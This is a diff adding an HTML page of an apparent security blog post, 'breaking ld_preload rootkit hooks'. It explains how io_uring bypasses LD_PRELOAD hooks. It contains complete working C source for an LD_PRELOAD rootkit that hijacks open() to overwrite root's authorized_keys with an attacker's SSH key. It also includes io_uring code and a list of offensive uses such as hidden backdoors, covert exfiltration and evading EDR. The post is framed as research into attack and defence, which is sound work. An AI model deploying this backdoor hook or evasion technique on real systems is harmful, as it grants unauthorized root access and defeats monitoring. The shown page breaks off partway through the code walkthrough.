@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>breaking ld_preload rootkit hooks | 0xMatheuZ</title>
+<meta name="keywords" content="Rootkit">
+<meta name="description" content="I miss you">
+<meta name="author" content="0xMatheuZ">
+<link rel="canonical" href="http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:title" content="breaking ld_preload rootkit hooks" />
+<meta property="og:description" content="I miss you" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/" /><meta property="article:section" content="hacking" />
+
+<meta property="og:site_name" content="0xMatheuZ" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="breaking ld_preload rootkit hooks"/>
+<meta name="twitter:description" content="I miss you"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hackings",
+      "item": "http://localhost:1313/hacking/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "breaking ld_preload rootkit hooks",
+      "item": "http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "breaking ld_preload rootkit hooks",
+  "name": "breaking ld_preload rootkit hooks",
+  "description": "I miss you",
+  "keywords": [
+    "Rootkit"
+  ],
+  "articleBody": " This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it’s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include #include #include #include #include #include #include typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \"/root/.ssh/authorized_keys\") == 0 || strcmp(pathname, \"authorized_keys\") == 0 || strcmp(pathname, \".ssh/authorized_keys\") == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \"open\"); if (!orig_open) { fprintf(stderr, \"Error loading orig open function: %s\\n\", dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026 O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\"/root/.ssh/authorized_keys\", O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u003c 0) { return fd; } const char *sshkey = \"ssh-rsa ....snip kali@kali\\n\"; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\"/root/.ssh/authorized_keys\", O_RDWR | O_APPEND, 0600); } if (flags \u0026 O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here’s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026\u0026 ( strcmp(pathname, \"/root/.ssh/authorized_keys\") == 0 || strcmp(pathname, \"authorized_keys\") == 0 || strcmp(pathname, \".ssh/authorized_keys\") == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \"open\"); if (!orig_open) { fprintf(stderr, \"Error loading original open: %s \", dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \"open\") to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026 O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\"/root/.ssh/authorized_keys\", O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \"ssh-rsa AAAAB3...snip... kali@kali \"; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\"/root/.ssh/authorized_keys\", O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026 O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include #include #include #include #include #include #include #include #include #define FILE_PATH \"/root/.ssh/authorized_keys\" #define CONTENT \"random\" int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026ring, 0); if (ret \u003c 0) { perror(\"io_uring_queue_init\"); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026ring); if (!sqe) { fprintf(stderr, \"Could not get SQE\\n\"); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026ring); if (ret \u003c 0) { perror(\"io_uring_submit\"); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026ring, \u0026cqe); if (ret \u003c 0) { perror(\"io_uring_wait_cqe\"); return 1; } fd = cqe-\u003eres; io_uring_cqe_seen(\u0026ring, cqe); if (fd \u003c 0) { fprintf(stderr, \"Failed to open file: %d\\n\", fd); return 1; } sqe = io_uring_get_sqe(\u0026ring); if (!sqe) { fprintf(stderr, \"Could not get SQE\\n\"); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026ring); if (ret \u003c 0) { perror(\"io_uring_submit\"); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026ring, \u0026cqe); if (ret \u003c 0) { perror(\"io_uring_wait_cqe\"); close(fd); return 1; } if (cqe-\u003eres \u003c 0) { fprintf(stderr, \"Write failed: %d\\n\", cqe-\u003eres); } io_uring_cqe_seen(\u0026ring, cqe); sqe = io_uring_get_sqe(\u0026ring); if (!sqe) { fprintf(stderr, \"Could not get SQE\\n\"); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026ring); if (ret \u003c 0) { perror(\"io_uring_submit\"); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026ring, \u0026cqe); if (ret == 0) { io_uring_cqe_seen(\u0026ring, cqe); } io_uring_queue_exit(\u0026ring); printf(\"gg!\\n\"); return 0; } Let’s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc’s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026ring, \u0026cqe); fd = cqe-\u003eres; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u003eres holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, …) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they’re submitted. This is because io_uring still operates through the kernel’s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n",
+  "wordCount" : "1800",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "0xMatheuZ"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "0xMatheuZ",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="MatheuZ (Alt + H)">
+                <img src="https://i.imgur.com/xeSd64L.png" alt="" aria-label="logo"
+                    height="25">MatheuZ</a>
+            <div class="logo-switches">
+                <ul class="lang-switch"><li>|</li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/hacking" title="hacking">
+                    <span>hacking</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/hacking/">Hackings</a></div>
+    <h1 class="post-title entry-hint-parent">
+      breaking ld_preload rootkit hooks
+    </h1>
+    <div class="post-description">
+      I miss you
+    </div>
+    <div class="post-meta">9 min&nbsp;·&nbsp;0xMatheuZ
+
+</div>
+  </header> 
+  <div class="post-content"><p><img loading="lazy" src="https://i.imgur.com/TGcNnzI.png" alt="imgur"  />
+</p>
+<p>This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as <code>open()</code>, <code>write()</code>, and <code>close()</code>, which are commonly intercepted in LD_PRELOAD based hooks, it&rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.</p>
+<p>We demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the <code>open()</code> call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., <code>io_uring_enter</code>, <code>io_uring_setup</code>) for coordination.</p>
+<h2 id="introduction-to-io_uring">Introduction to io_uring<a hidden class="anchor" aria-hidden="true" href="#introduction-to-io_uring">#</a></h2>
+<p><code>io_uring</code> is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.</p>
+<p>Key Benefits of io_uring:</p>
+<ul>
+<li><strong>Lower syscall overhead</strong></li>
+<li><strong>Direct submission of I/O reduces the frequency and cost of context switches</strong></li>
+<li><strong>Kernel land execution reduces visibility to userland hooks</strong></li>
+</ul>
+<p>This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.</p>
+<h2 id="rootkits-via-ld_preload">Rootkits via LD_PRELOAD<a hidden class="anchor" aria-hidden="true" href="#rootkits-via-ld_preload">#</a></h2>
+<p>A common technique used in userland rootkits is to hook libc functions like <code>open()</code>, <code>read()</code>, and <code>write()</code> using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.</p>
+<h2 id="example-ld_preload-rootkit-explained">Example: LD_PRELOAD Rootkit Explained<a hidden class="anchor" aria-hidden="true" href="#example-ld_preload-rootkit-explained">#</a></h2>
+<p>This example demonstrates a userspace hook for the <code>open()</code> function to detect when a process tries to open <code>/root/.ssh/authorized_keys</code>, and instead injects an SSH key, enabling unauthorized access.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// https://discord.gg/66N5ZQppU7
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;dlfcn.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdarg.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span><span class="o">*</span><span class="n">open_func_type</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="p">...);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">open_func_type</span> <span class="n">orig_open</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">target</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">pathname</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="s">&#34;/root/.ssh/authorized_keys&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">           <span class="nf">strcmp</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="s">&#34;authorized_keys&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">           <span class="nf">strcmp</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="s">&#34;.ssh/authorized_keys&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">open</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="p">...)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">va_list</span> <span class="n">args</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">mode_t</span> <span class="n">mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_open</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">orig_open</span> <span class="o">=</span> <span class="p">(</span><span class="n">open_func_type</span><span class="p">)</span><span class="nf">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">&#34;open&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_open</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error loading orig open function: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">dlerror</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">O_CREAT</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mode</span> <span class="o">=</span> <span class="nf">va_arg</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">target</span><span class="p">(</span><span class="n">pathname</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">orig_open</span><span class="p">(</span><span class="s">&#34;/root/.ssh/authorized_keys&#34;</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_CREAT</span> <span class="o">|</span> <span class="n">O_TRUNC</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">sshkey</span> <span class="o">=</span> <span class="s">&#34;ssh-rsa ....snip kali@kali</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">sshkey</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">sshkey</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">orig_open</span><span class="p">(</span><span class="s">&#34;/root/.ssh/authorized_keys&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_APPEND</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">O_CREAT</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">orig_open</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">mode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">orig_open</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span></code></pre></div><h2 id="detailed-behavior-of-the-ld_preload-rootkit">Detailed Behavior of the LD_PRELOAD Rootkit<a hidden class="anchor" aria-hidden="true" href="#detailed-behavior-of-the-ld_preload-rootkit">#</a></h2>
+<p>This rootkit relies on the LD_PRELOAD environment variable to hijack the <code>open()</code> function call from the standard C library. Here&rsquo;s a breakdown of its logic and behavior:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span><span class="o">*</span><span class="n">open_func_type</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="p">...);</span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">open_func_type</span> <span class="n">orig_open</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span></code></pre></div><p>A new function pointer type is defined for <code>open()</code>, allowing us to call the real <code>open()</code> after we hook it. orig_open will be initialized using dlsym() to point to the original function.</p>
+<p>Target File Detection</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">target</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pathname</span> <span class="o">&amp;&amp;</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">strcmp</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="s">&#34;/root/.ssh/authorized_keys&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">strcmp</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="s">&#34;authorized_keys&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">strcmp</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="s">&#34;.ssh/authorized_keys&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The <code>target()</code> function checks if the file being accessed is the SSH authorized keys file. It performs a simple <code>strcmp()</code> against several known variants of the authorized_keys path.</p>
+<p>Hooking the <code>open()</code> Function</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">open</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="p">...)</span> <span class="p">{</span>
+</span></span></code></pre></div><p>This is our hook. Because the name matches <code>open()</code> and LD_PRELOAD is set, all calls to <code>open()</code> will now invoke this custom implementation.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_open</span><span class="p">)</span> <span class="p">{</span>
